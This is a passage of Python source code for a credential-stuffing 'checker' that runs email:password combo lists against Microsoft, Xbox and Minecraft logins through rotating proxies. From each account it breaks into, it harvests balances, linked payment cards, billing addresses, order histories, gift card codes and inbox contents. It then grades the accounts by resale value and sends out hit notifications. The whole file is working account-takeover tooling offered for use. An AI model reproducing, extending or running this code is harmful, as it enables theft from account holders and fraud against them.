                for k in ('money','kills','deaths','broken_blocks','mobs_killed','placed_blocks','money_made_from_sell','money_spent_on_shop'):
                    v = stats_data.get(k)
                    if v: lines.append(f'{k}:{v}')
                pt = stats_data.get('playtime')
                if pt:
                    try:
                        pt = int(pt)
                        d, rem = divmod(pt, 86400); h, rem = divmod(rem, 3600); m = rem // 60
                        lines.append(f'playtime:{d}d{h}h{m}m')
                    except: lines.append(f'playtime:{pt}')
                return ' | '.join(lines) if lines else 'Registered'
        elif r.status_code == 404:
            return None
    except Exception:
        return None
    return None


# =====================================================================
# ============ NEW CHECKER CLASSES (Minecraft + MS Balance) ===========
# =====================================================================

class MinecraftChecker:
    """Full Minecraft account capture: MS→Xbox→MC→profile→all v3 fetchers→DonutSMP"""
    def __init__(self, email, password, proxy=None, keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.keywords = keywords or ['Steam', 'Xbox', 'Microsoft', 'Minecraft']
        self.session = create_optimized_session(proxy=proxy)
        self._diag = {}
        # Result accumulator
        self.cap = {
            'email': email, 'password': password,
            'name': None, 'uuid': None, 'capes': None,
            'type': None, 'hypixl': None, 'level': None, 'firstlogin': None, 'lastlogin': None,
            'bwstars': None, 'swstars': None, 'sbnetworth': None, 'sbcoins': None, 'pitcoins': None,
            'banned': None, 'access': None, 'namechanged': None, 'namechange_available': None,
            'lastchanged': None, 'cubecraft_stats': None, 'lunar_stats': None,
            'ms_balance': None, 'ms_payment_methods': [], 'ms_rewards': None,
            'ms_recovery_email': None, 'ms_phone_hint': None, 'ms_country': None,
            'og_name': None, 'skin_info': None, 'cape_value_str': None, 'cape': None,
            'account_age': None, 'twofa_type': None, 'sub_expiry': None, 'xbox_gamertag': None,
            'alt_type': None, 'gift_card_bal': None, 'guild_info': None, 'capes_dev': None,
            'labymod_info': None, 'badlion_info': None, 'tlauncher_cape': None, 'fivezig_cape': None,
            'mineskin_info': None, 'mineplex_info': None, 'wynncraft_info': None, 'hive_info': None,
            'pika_info': None, 'gommehd_info': None, 'mineheroes_info': None, 'minemen_info': None,
            'slothpixel_info': None, 'github_info': None, 'cosmetica_info': None,
            'essential_info': None, 'mccapes_info': None, 'quasar_cape': None, 'feather_info': None,
            'salwyrr_info': None, 'zeqa_info': None, 'jartex_info': None, 'galaxite_info': None,
            'name_history': None, 'name_rarity': None, 'realms_info': None, 'breach_info': None,
            'short_name_value': None, 'sw_prestige': None, 'mm_kills': None, 'mm_wins': None,
            'bb_score': None, 'bb_wins': None, 'bedrock_info': None, 'namemc_favs': None,
            'optifine_detail': None, 'crafatar_url': None, 'paypal_bal': None, 'cc_types': None,
            'billing_detail': None, 'active_subs': None, 'order_history': None,
            'linked_accounts': None, 'donut_smp': None, 'value_score': 0, 'value_tier': 'C',
            'meowapi': None,
        }

    def login_ms(self):
        url_post, sft_tag = _get_ms_tokens(self.session)
        self._diag['ppft_or_urlpost'] = bool(url_post and sft_tag)
        if not url_post: return None
        data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sft_tag}
        try:
            res = self.session.post(url_post, data=data, allow_redirects=True, timeout=15, verify=False)
        except requests.exceptions.ProxyError:
            raise
        self._diag['login_final_url'] = (res.url or '')[:200]
        if '#' in res.url:
            return parse_qs(urlparse(res.url).fragment).get('access_token', [None])[0]
        elif 'cancel?mkt=' in res.text:
            try:
                ipt = re.search('(?<="ipt" value=").+?(?=">)', res.text).group()
                pprid = re.search('(?<="pprid" value=").+?(?=">)', res.text).group()
                uaid = re.search('(?<="uaid" value=").+?(?=">)', res.text).group()
                post_url = re.search('(?<=id="fmHF" action=").+?(?=" )', res.text).group()
                ret = self.session.post(post_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid},
                                        allow_redirects=True, verify=False)
                final_redirect = re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                fin = self.session.get(final_redirect, allow_redirects=True, verify=False)
                return parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
            except Exception:
                self._diag['reason'] = 'recovery_flow'
                return None
        elif any(v in res.text.lower() for v in ['password is incorrect', "account doesn't exist",
                'too many times', 'help us protect your account']):
            self._diag['reason'] = 'wrong_password_or_locked'
            return None
        elif any(v in res.text for v in ['recover?mkt', '/Abuse?mkt=', 'identity/confirm?mkt']):
            self._diag['reason'] = 'needs_verification'
            return None
        return None

    def check(self):
        try:
            ms_token = self.login_ms()
            if not ms_token:
                return {'status': 'BAD', 'diag': self._diag}
            self._diag['token_found'] = True

            # Xbox
            xbl = self.session.post('https://user.auth.xboxlive.com/user/authenticate',
                json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                      "RpsTicket": ms_token},
                      "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
                timeout=15, verify=False)
            if xbl.status_code != 200:
                self._diag['reason'] = f'xbl_auth_{xbl.status_code}'
                return {'status': 'BAD', 'diag': self._diag}
            xbl_data = xbl.json()
            try:
                uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']
                xbl_token = xbl_data['Token']
            except (KeyError, IndexError):
                self._diag['reason'] = 'no_xbl_token'
                return {'status': 'BAD', 'diag': self._diag}

            # XSTS for MC
            xsts = self.session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                      "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"},
                timeout=15, verify=False)
            if xsts.status_code != 200:
                self._diag['reason'] = f'xsts_{xsts.status_code}'
                return {'status': 'BAD', 'diag': self._diag}
            xsts_data = xsts.json()
            if 'XErr' in xsts_data:
                xerr = xsts_data.get('XErr')
                if xerr in (2148916233, 2148916238):
                    self._diag['reason'] = 'region_or_minor'
                    return {'status': 'BAD', 'diag': self._diag}
                self._diag['reason'] = f'xsts_xerr_{xerr}'
                return {'status': 'BAD', 'diag': self._diag}
            xsts_token = xsts_data.get('Token')

            # MC login
            mc_auth = self.session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'},
                timeout=15, verify=False)
            if mc_auth.status_code != 200:
                self._diag['reason'] = f'mc_auth_{mc_auth.status_code}'
                return {'status': 'BAD', 'diag': self._diag}
            mc_token = mc_auth.json().get('access_token')
            if not mc_token:
                self._diag['reason'] = 'no_mc_token'
                return {'status': 'BAD', 'diag': self._diag}

            # Entitlements
            acctype = None
            ent_txt = ''
            for ep in ['https://api.minecraftservices.com/entitlements/mcstore',
                       'https://api.minecraftservices.com/entitlements/license']:
                try:
                    ent = self.session.get(ep, headers={'Authorization': f'Bearer {mc_token}'},
                                            timeout=15, verify=False)
                    if ent.status_code == 200:
                        acctype = self._classify_entitlements(ent.json())
                        ent_txt = ent.text.lower()
                        break
                except Exception:
                    pass

            # Profile
            profile = {}
            try:
                pr = self.session.get('https://api.minecraftservices.com/minecraft/profile',
                                       headers={'Authorization': f'Bearer {mc_token}'},
                                       timeout=15, verify=False)
                if pr.status_code == 200:
                    profile = pr.json() or {}
            except Exception:
                pass

            name = profile.get('name', 'N/A') or 'N/A'
            uuid_str = profile.get('id', 'N/A') or 'N/A'
            capes = ', '.join([c.get('alias') for c in profile.get('capes', []) if c.get('alias')]) or None

            if not acctype and name and name != 'N/A':
                acctype = 'Normal Minecraft'
            if not acctype:
                self._diag['reason'] = 'no_entitlements'
                return {'status': 'BAD', 'diag': self._diag}

            self.cap['name'] = name
            self.cap['uuid'] = uuid_str
            self.cap['capes'] = capes
            self.cap['type'] = acctype

            # Run all fetchers if we have a name
            if name and name != 'N/A':
                self._run_fetchers()
            # MS-side fetchers (still work without a MC name)
            self._run_ms_fetchers()

            # Value score
            self.cap['value_score'] = calculate_value_score(self.cap)
            self.cap['value_tier'] = get_value_tier(self.cap['value_score'])

            return {'status': 'HIT', 'data': dict(self.cap), 'diag': self._diag}
        except requests.exceptions.ProxyError:
            raise
        except Exception as e:
            self._diag['exception'] = str(e)[:200]
            return {'status': 'ERROR', 'error': str(e)[:200], 'diag': self._diag}

    def _classify_entitlements(self, ent_data):
        items = ent_data.get('items', []) if isinstance(ent_data, dict) else []
        has_mc = False; has_gp_pc = False; has_gp_ult = False
        _MC = {'game_minecraft','product_minecraft','product_game_minecraft','minecraft',
               'game_minecraft_bedrock','product_minecraft_java','product_minecraft_bedrock',
               'game_minecraft_java_edition'}
        _GP_PC = {'product_game_pass_pc','game_pass_pc','pc_game_pass','gamepass_pc'}
        _GP_ULT = {'product_game_pass_ultimate','game_pass_ultimate',
                   'product_xbox_game_pass_ultimate','xbox_game_pass_ultimate','game_pass_ultimate_monthly'}
        for it in items:
            n = str(it.get('name', '') or '').lower().strip()
            s = str(it.get('source', '') or '').upper().strip()
            if n in _MC: has_mc = True
            if n in _GP_ULT or s in ('GAME_PASS_ULTIMATE', 'XBOX_GAME_PASS_ULTIMATE'): has_gp_ult = True
            if n in _GP_PC or s in ('GAME_PASS', 'GAME_PASS_PC'): has_gp_pc = True
        if has_mc and has_gp_ult: return 'Normal Minecraft (with Game Pass Ultimate)'
        if has_mc and has_gp_pc: return 'Normal Minecraft (with Game Pass)'
        if has_mc: return 'Normal Minecraft'
        if has_gp_ult: return 'Xbox Game Pass Ultimate'
        if has_gp_pc: return 'Xbox Game Pass (PC)'
        if items and any('minecraft' in str(i).lower() for i in items):
            return 'Normal Minecraft'
        return None

    def _run_fetchers(self):
        name = self.cap['name']; uuid_str = self.cap['uuid']; email = self.email
        proxy = self.proxy

        # Hypixel plancke scrape
        try:
            px = {'http': proxy, 'https': proxy} if proxy else None
            resp = self.session.get('https://plancke.io/hypixel/player/stats/' + name,
                                     proxies=px, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                                     verify=False, timeout=(5, 10))
            tx = resp.text
            m = re.search(r'<title>(.+?)\s*\|\s*Plancke</title>', tx, re.IGNORECASE)
            if m: self.cap['hypixl'] = m.group(1)
            else:
                m2 = re.search(r'\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*' + re.escape(name), tx, re.I)
                if m2: self.cap['hypixl'] = m2.group(0)
            m = re.search(r'(?<=Level:</b> ).+?(?=<br/><b>)', tx)
            if m: self.cap['level'] = m.group()
            m = re.search(r'(?<=<b>First login: </b>).+?(?=<br/><b>)', tx)
            if m: self.cap['firstlogin'] = m.group()
            m = re.search(r'(?<=<b>Last login: </b>).+?(?=<br/>)', tx)
            if m: self.cap['lastlogin'] = m.group()
            m = re.search(r'(?<=<li><b>Level:</b> ).+?(?=</li>)', tx)
            if m:
                try: self.cap['bwstars'] = int(m.group().strip())
                except: self.cap['bwstars'] = m.group().strip()
        except Exception:
            pass

        # Optifine cape
        try:
            px = {'http': proxy, 'https': proxy} if proxy else None
            t = self.session.get(f'http://s.optifine.net/capes/{name}.png',
                                  proxies=px, verify=False, timeout=8).text
            self.cap['cape'] = 'No' if 'Not found' in t else 'Yes'
        except Exception:
            pass

        # meowapi
        try:
            meow = fetch_meowapi_stats(name, uuid_str if uuid_str != 'N/A' else None)
            if meow:
                self.cap['meowapi'] = meow
                m = re.search(r'SW: (\d+)', meow)
                if m: self.cap['swstars'] = m.group(1)
                m = re.search(r'NW: ([^ ]+)', meow)
                if m: self.cap['sbnetworth'] = m.group(1)
                m = re.search(r'Purse: ([^ ]+)', meow)
                if m: self.cap['sbcoins'] = m.group(1)
                m = re.search(r'Pit_Gold: ([^ ]+)', meow)
                if m: self.cap['pitcoins'] = m.group(1)
                m = re.search(r'BW: (\d+)', meow)
                if m and not self.cap['bwstars']: self.cap['bwstars'] = int(m.group(1))
        except Exception:
            pass

        # Donut SMP
        try:
            self.cap['donut_smp'] = check_donut_smp_standalone(name, proxy)
        except Exception:
            pass

        # Parallel batch of v3 fetchers
        tasks = [
            ('capes_dev', fetch_capes_dev, [uuid_str]),
            ('labymod_info', fetch_labymod_profile, [uuid_str]),
            ('badlion_info', fetch_badlion_profile, [name]),
            ('tlauncher_cape', fetch_tlauncher_cape, [uuid_str]),
            ('fivezig_cape', fetch_5zig_cape, [uuid_str]),
            ('mineskin_info', fetch_mineskin_info, [name]),
            ('mineplex_info', fetch_mineplex_stats, [name]),
            ('wynncraft_info', fetch_wynncraft_stats, [name]),
            ('hive_info', fetch_hive_stats, [name]),
            ('pika_info', fetch_pika_stats, [name]),
            ('gommehd_info', fetch_gommehd_stats, [name]),
            ('mineheroes_info', fetch_mineheroes_stats, [name]),
            ('minemen_info', fetch_minemen_stats, [name]),
            ('slothpixel_info', fetch_slothpixel_stats, [name]),
            ('github_info', fetch_github_by_email, [email]),
            ('cosmetica_info', fetch_cosmetica, [uuid_str]),
            ('essential_info', fetch_essential_cosmetics, [uuid_str]),
            ('mccapes_info', fetch_minecraftcapes, [uuid_str]),
            ('quasar_cape', fetch_quasar_cape, [uuid_str]),
            ('feather_info', fetch_feather_client, [name]),
            ('salwyrr_info', fetch_salwyrr, [uuid_str]),
            ('zeqa_info', fetch_zeqa_stats, [name]),
            ('jartex_info', fetch_jartex_stats, [name]),
            ('galaxite_info', fetch_galaxite_stats, [name]),
            ('name_history', fetch_name_history, [name]),
            ('breach_info', check_breach_count, [email]),
            ('cubecraft_stats', fetch_cubecraft_stats, [name]),
            ('lunar_stats', fetch_lunar_stats, [uuid_str]),
        ]
        def _run(task):
            attr, fn, args = task
            try:
                v = fn(*args)
                if v is not None: self.cap[attr] = v
            except Exception:
                pass
        with ThreadPoolExecutor(max_workers=12) as ex:
            list(ex.map(_run, tasks))

        # Sync slothpixel BW
        if self.cap.get('slothpixel_info') and not self.cap.get('bwstars'):
            m = re.search(r'BW\[.*?\*(\d+)', str(self.cap['slothpixel_info']))
            if m: self.cap['bwstars'] = int(m.group(1))

        # Parse extra hypixel stats from meowapi
        try:
            extra = parse_extra_hypixel_stats(str(self.cap.get('meowapi', '')))
            for k in ('sw_prestige','mm_kills','mm_wins','bb_score','bb_wins'):
                if extra.get(k): self.cap[k] = extra[k]
        except Exception:
            pass

        # Post-API supplementary fetchers
        try: self.cap['og_name'] = detect_og_name(name)
        except: pass
        try: self.cap['name_rarity'] = fetch_username_rarity(name)
        except: pass
        try: self.cap['short_name_value'] = check_short_name_value(name)
        except: pass
        try:
            if uuid_str and uuid_str != 'N/A':
                self.cap['skin_info'] = fetch_namemc_skin(name, uuid_str)
        except: pass
        try: self.cap['cape_value_str'] = get_cape_value(self.cap.get('capes'))
        except: pass
        try:
            if uuid_str and uuid_str != 'N/A':
                self.cap['crafatar_url'] = get_crafatar_url(uuid_str)
        except: pass
        try: self.cap['namemc_favs'] = fetch_namemc_favorites(name)
        except: pass
        try: self.cap['optifine_detail'] = fetch_optifine_detail(name)
        except: pass
        try: self.cap['guild_info'] = fetch_hypixel_guild(name)
        except: pass

    def _run_ms_fetchers(self):
        # MS-country + balance (main ask)
        try: self.cap['ms_country'] = fetch_ms_country(self.session)
        except: pass
        try: self.cap['ms_balance'] = fetch_ms_balance(self.session)
        except: pass
        try:
            pms = fetch_ms_payment_methods(self.session)
            if pms:
                self.cap['ms_payment_methods'] = pms
                self.cap['cc_types'] = parse_cc_types(str(pms))
        except: pass
        try: self.cap['sub_expiry'] = fetch_sub_expiry(self.session)
        except: pass
        try: self.cap['xbox_gamertag'] = fetch_xbox_gamertag(self.session)
        except: pass
        try: self.cap['alt_type'] = detect_alt_account(self.session)
        except: pass
        try: self.cap['gift_card_bal'] = fetch_gift_card_balance(self.session)
        except: pass
        try: self.cap['account_age'] = fetch_account_age(self.session)
        except: pass
        try: self.cap['twofa_type'] = detect_2fa_type(self.session)
        except: pass
        try: self.cap['billing_detail'] = fetch_billing_address_detail(self.session)
        except: pass
        try: self.cap['active_subs'] = fetch_active_subscriptions(self.session)
        except: pass
        try: self.cap['order_history'] = fetch_ms_order_history(self.session)
        except: pass
        try: self.cap['linked_accounts'] = fetch_linked_accounts(self.session)
        except: pass
        try: self.cap['bedrock_info'] = fetch_bedrock_info(self.session)
        except: pass
        try: self.cap['realms_info'] = check_minecraft_realms(self.session)
        except: pass
        try: self.cap['paypal_bal'] = fetch_paypal_balance(self.session)
        except: pass


class MicrosoftBalanceChecker:
    """Standalone Microsoft balance + linked cards checker."""
    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.session = create_optimized_session(proxy=proxy)
        self._diag = {}

    def check(self):
        try:
            # login
            url_post, sft_tag = _get_ms_tokens(self.session)
            self._diag['ppft_or_urlpost'] = bool(url_post and sft_tag)
            if not url_post:
                return {'status': 'BAD', 'diag': self._diag}
            data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sft_tag}
            res = self.session.post(url_post, data=data, allow_redirects=True, timeout=15, verify=False)
            self._diag['login_final_url'] = (res.url or '')[:200]
            ms_token = None
            if '#' in res.url:
                ms_token = parse_qs(urlparse(res.url).fragment).get('access_token', [None])[0]
            elif 'cancel?mkt=' in res.text:
                try:
                    ipt = re.search('(?<="ipt" value=").+?(?=">)', res.text).group()
                    pprid = re.search('(?<="pprid" value=").+?(?=">)', res.text).group()
                    uaid = re.search('(?<="uaid" value=").+?(?=">)', res.text).group()
                    post_url = re.search('(?<=id="fmHF" action=").+?(?=" )', res.text).group()
                    ret = self.session.post(post_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid},
                                            allow_redirects=True, verify=False)
                    final_redirect = re.search('(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                    fin = self.session.get(final_redirect, allow_redirects=True, verify=False)
                    ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                except Exception:
                    pass
            if not ms_token:
                self._diag['reason'] = 'no_token'
                return {'status': 'BAD', 'diag': self._diag}
            self._diag['token_found'] = True

            balance = fetch_ms_balance(self.session)
            payment_methods = fetch_ms_payment_methods(self.session)
            subs = fetch_active_subscriptions(self.session)
            country = fetch_ms_country(self.session)
            order_h = fetch_ms_order_history(self.session)
            linked = fetch_linked_accounts(self.session)
            cc_types = parse_cc_types(str(payment_methods)) if payment_methods else None

            result = {
                'email': self.email, 'password': self.password,
                'balance': balance, 'payment_methods': payment_methods,
                'subscriptions': subs, 'country': country,
                'orders': order_h, 'linked_accounts': linked,
                'cc_types': cc_types,
            }
            has_anything = bool(balance and balance != '0.00 USD' or payment_methods or subs or linked)
            return {'status': 'HIT' if has_anything else 'ZERO', 'data': result, 'diag': self._diag}
        except requests.exceptions.ProxyError:
            raise
        except Exception as e:
            self._diag['exception'] = str(e)[:200]
            return {'status': 'ERROR', 'error': str(e)[:200], 'diag': self._diag}


# ===== Session =====
class CheckSession:
    def __init__(self, accounts, keywords, checker_type="hotmail",
                 filename="", proxies=None, threads=THREADS_DEFAULT):
        self.session_id = str(uuid.uuid4())[:8]
        self.accounts = deque(accounts)
        self.keywords = keywords
        self.checker_type = checker_type
        self.filename = filename
        self.proxy_pool = ProxyPool(proxies)
        self.threads = max(THREADS_MIN, min(THREADS_MAX, int(threads)))

        self.total = len(accounts)
        self.checked = self.valid = self.inbox = self.twofa = self.bad = 0
        self.errors = self.premium = self.free = self.banned = 0
        self.gamerscore_count = self.gamepass_count = 0
        self.rewards_points = self.rewards_hits = self.rewards_zero = 0
        self.rewards_custom = self.rewards_rate_limit = 0
        self.codes_found: List[Dict[str, str]] = []
        self.accounts_with_codes = 0
        self._seen_codes: Set[str] = set()

        # NEW counters for integrated checkers
        self.mc_with_name = 0
        self.mc_balance = 0
        self.mc_cards = 0
        self.mc_donut = 0
        self.mc_hypixel = 0
        self.ms_balance_hits = 0

        self.proxy_depleted = False

        self.results = {'valid': [], 'twofa': [], 'banned': [], 'premium': [],
                        'free': [], 'games': [], 'rewards_hits': [], 'rewards_zero': [],
                        'rewards_custom': [], 'rewards_rate_limit': [],
                        # NEW buckets
                        'mc_full': [], 'mc_names': [], 'mc_balance': [], 'mc_xgpu': [], 'mc_hypixel': [],
                        'ms_balance': [], 'ms_cards': []}
        self.keyword_accounts: Dict[str, Set[str]] = {}
        self.keyword_details: Dict[str, List[str]] = {}

        self.running = True
        self.stopped = False
        self.completed = False
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        self.active = 0
        self.hits = deque(maxlen=HIT_FEED_SIZE)
        self.hits_lock = threading.Lock()
        self.log_entries = deque(maxlen=2000)   # for CHECKING LOGS tab

    def stop(self):
        with self.lock:
            self.running = False
            self.stopped = True

    def add_hit(self, category, text, color="green"):
        with self.hits_lock:
            self.hits.append({'time': datetime.now().strftime('%H:%M:%S'),
                              'category': category, 'text': text, 'color': color})
        self.add_log(category, text)
        if category not in ("BAD", "ERROR", "PROXY_DEAD"):
            send_notifications(category, text)

    def add_log(self, kind, text):
        with self.hits_lock:
            self.log_entries.append({
                'time': datetime.now().strftime('%H:%M:%S'),
                'kind': kind, 'text': text,
            })

    def get_logs(self, limit=500):
        with self.hits_lock:
            return list(self.log_entries)[-limit:]

    def get_stats(self):
        with self.lock:
            elapsed = (datetime.now() - self.start_time).total_seconds()
            cpm = int(self.checked / elapsed * 60) if elapsed > 1 and self.checked > 10 else 0
            pct = (self.checked / self.total * 100) if self.total > 0 else 0
            p_stats = self.proxy_pool.stats()
            return {'total': self.total, 'checked': self.checked, 'valid': self.valid,
                    'inbox': self.inbox, 'twofa': self.twofa, 'bad': self.bad,
                    'errors': self.errors, 'premium': self.premium, 'free': self.free,
                    'banned': self.banned, 'gamerscore': self.gamerscore_count,
                    'gamepass': self.gamepass_count, 'rewards_points': self.rewards_points,
                    'rewards_hits': self.rewards_hits, 'rewards_zero': self.rewards_zero,
                    'rewards_custom': self.rewards_custom,
                    'rewards_rate_limit': self.rewards_rate_limit,
                    'codes_found': len(self.codes_found),
                    'accounts_with_codes': self.accounts_with_codes,
                    'mc_with_name': self.mc_with_name,
                    'mc_balance': self.mc_balance,
                    'mc_cards': self.mc_cards,
                    'mc_donut': self.mc_donut,
                    'mc_hypixel': self.mc_hypixel,
                    'ms_balance_hits': self.ms_balance_hits,
                    'cpm': cpm, 'elapsed': elapsed, 'percent': pct,
                    'running': self.running, 'stopped': self.stopped,
                    'completed': self.completed, 'active': self.active,
                    'checker_type': self.checker_type,
                    'proxied': len(self.proxy_pool.proxies) > 0,
                    'proxy_alive': p_stats['alive'],
                    'proxy_dead': p_stats['dead'],
                    'proxy_depleted': self.proxy_depleted,
                    'threads': self.threads}

    def get_hits(self, limit=80):
        with self.hits_lock:
            return list(self.hits)[-limit:]

# ===== Check functions =====
def check_hotmail_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    checker = MicrosoftInboxChecker(email, password, proxy=proxy,
                                    inbox_keywords=session.keywords, threads=session.threads)
    status = checker.login()
    
    if status == 'SUCCESS':
        with session.lock:
            session.valid += 1
            session.results['valid'].append(f"{email}:{password}")
        graph_token = checker.get_graph_token()
        country = 'Unknown'
        if graph_token and checker.get_profile_via_graph(graph_token):
            country = checker.country or 'Unknown'
        if not country or country == 'Unknown':
            if checker.get_profile_via_substrate():
                country = checker.country or 'Unknown'
        total_count, inbox_hits = checker.check_inbox()
        if inbox_hits:
            with session.lock:
                session.inbox += 1
                messages = checker.get_keyword_messages()
                flag = get_flag(country)
                for hit in inbox_hits:
                    parts = hit.split(': ')
                    if len(parts) == 2:
                        keyword = parts[0].replace('(body)', '').strip()
                        count = parts[1]
                        session.keyword_accounts.setdefault(keyword, set()).add(email)
                        hit_info = (f"{email}:{password} | {flag} Country = {country.upper()}"
                                    f" | Keyword = {keyword} ({count})")
                        if keyword in messages and messages[keyword]:
                            msg = messages[keyword][0]
                            hit_info += (f" | Last Message Date = {format_date(msg.get('date', ''))}"
                                         f" | Last Sender = {msg.get('sender', 'Unknown')}"
                                         f" | Subject = {msg.get('subject', 'No Subject')}"
                                         f" | Name = {checker.name or 'Unknown'}")
                        session.keyword_details.setdefault(keyword, []).append(hit_info)
                session.results['inbox'].append(
                    f"{email}:{password} | {country} | {total_count} Found | [{', '.join(inbox_hits)}]")
            session.add_hit("INBOX", f"{email} | {', '.join(inbox_hits)}", "gold")
    elif status == '2FA':
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    else:
        errs = str(checker._diag.get('errors', []))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.bad += 1
        reason = checker._diag.get('reason', '')
        if reason: session.add_hit("BAD", f"{email} ({reason})", "danger")

def check_xbox_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    chk = XboxChecker(proxy=proxy)
    result = chk.check_v2(email, password)
    status = result.get('status', 'BAD')
    data = result.get('data', {})
    
    if status in ('PREMIUM', 'FREE'):
        with session.lock:
            session.valid += 1
            if status == 'PREMIUM':
                session.premium += 1
            else:
                session.free += 1
            gs = data.get('gamerscore', 0)
            session.gamerscore_count += gs
            if data.get('gamepass', 'none') != 'none':
                session.gamepass_count += 1
        session.add_hit("PREMIUM" if status == 'PREMIUM' else "FREE",
                        f"{email} | {data.get('gamerscore', 0)}G | {data.get('gamepass_type', '-')}",
                        "gold" if status == 'PREMIUM' else "cyan")
    elif status == '2FA':
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    elif status == 'BANNED':
        with session.lock:
            session.banned += 1
            session.results['banned'].append(f"{email}:{password}")
        session.add_hit("BANNED", email, "danger")
    else:
        errs = str(chk._diag.get('reason', ''))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.bad += 1
        reason = chk._diag.get('reason', '')
        if reason: session.add_hit("BAD", f"{email} ({reason})", "danger")

def check_rewards_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    chk = RewardsChecker(proxy=proxy)
    status, result = chk.check_account(email, password)
    
    if status == "HIT":
        with session.lock:
            session.rewards_hits += 1
            session.valid += 1
            points = result.get('points', 0)
            session.rewards_points += points
            session.results['rewards_hits'].append(f"{email}:{password} - [{points}]")
        session.add_hit("REWARDS", f"{email} | {points}pts", "gold")
    elif status == "ZERO":
        with session.lock:
            session.rewards_zero += 1
            session.valid += 1
            session.results['rewards_zero'].append(f"{email}:{password} - [0]")
        session.add_hit("ZERO", email, "warn")
    elif status == "CUSTOM":
        with session.lock:
            session.rewards_custom += 1
            session.valid += 1
            session.results['rewards_custom'].append(
                f"{email}:{password} | Custom: No Rewards | Country: {result.get('country', 'Unknown')}")
        session.add_hit("CUSTOM", email, "cyan")
    elif status == "RATE_LIMIT":
        with session.lock:
            session.rewards_rate_limit += 1
            session.errors += 1
            session.results['rewards_rate_limit'].append(f"{email}:{password}")
        session.add_hit("RATE_LIMIT", email, "danger")
    elif status == "2FA":
        with session.lock:
            session.twofa += 1
            session.results['twofa'].append(f"{email}:{password}")
        session.add_hit("2FA", email, "warn")
    else:
        errs = str(chk._diag.get('reason', ''))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.bad += 1
        reason = chk._diag.get('reason', '')
        if reason: session.add_hit("BAD", f"{email} ({reason})", "danger")

def check_codefetcher_account(session: CheckSession, combo: str, proxy: str):
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    
    diag = {}
    codes = _fetch_codes_for_account(email, password, proxy=proxy, diag=diag)
    
    if codes:
        with session.lock:
            session.valid += 1
            session.accounts_with_codes += 1
            session.results['valid'].append(f"{email}:{password}")
            for code in codes:
                if code in session._seen_codes: continue
                session._seen_codes.add(code)
                session.codes_found.append({
                    'code': code, 'email': email, 'password': password,
                    'info': "GIFTCARDS CODE",
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')})
        for c in codes:
            session.add_hit("CODE", f"{c} | {email}", "gold")
    else:
        errs = str(diag.get('exception', ''))
        if proxy and ("Max retries exceeded" in errs or "ProxyError" in errs or "HTTPSConnectionPool" in errs):
            raise Exception("PROXY_DEAD")
        with session.lock:
            session.bad += 1
        reason = diag.get('reason', '') or ('no_token' if not diag.get('token_found') else 'no_codes')
        session.add_hit("BAD", f"{email} ({reason})", "danger")


def check_minecraft_account(session: CheckSession, combo: str, proxy: str):
    """NEW: full Minecraft account capture"""
    if ':' not in combo: return
    email, password = combo.split(':', 1)
    email, password = email.strip(), password.strip()
    try:
        chk = MinecraftChecker(email, password, proxy=proxy)
        r = chk.check()
    except requests.exceptions.ProxyError:
        raise
    except Exception as e:
        with session.lock:
            session.errors += 1
            session.bad += 1
        session.add_hit("ERROR", f"{email} | {str(e)[:80]}", "danger")
        return

    status = r.get('status', 'BAD')
    if status == 'HIT':
        data = r.get('data', {})
        with session.lock:
            session.valid += 1
            if data.get('name') and data['name'] != 'N/A': session.mc_with_name += 1
            if data.get('ms_balance') and data['ms_balance'] != '0.00 USD': session.mc_balance += 1
            if data.get('ms_payment_methods'): session.mc_cards += 1
            if data.get('donut_smp'): session.mc_donut += 1
            if data.get('slothpixel_info') or data.get('hypixl'): session.mc_hypixel += 1

            # Build compact line for records
            line = f"{email}:{password}"
            if data.get('name') and data['name'] != 'N/A':
                line += f" | {data['name']}"
            if data.get('type'): line += f" | {data['type']}"
            if data.get('hypixl'): line += f" | {data['hypixl']}"
